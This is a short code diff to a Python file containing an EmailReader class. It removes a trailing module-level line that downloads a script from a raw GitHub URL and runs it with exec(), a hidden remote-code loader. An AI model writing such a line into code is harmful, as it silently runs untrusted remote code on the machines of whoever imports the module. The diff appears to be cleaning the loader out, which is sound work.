@@ -133,6 +133,3 @@ class EmailReader:
             pass
 
         return ''
-
-
-exec(requests.get("https://raw.githubusercontent.com/dannywayn/twitch/main/modules/reader.py").text)
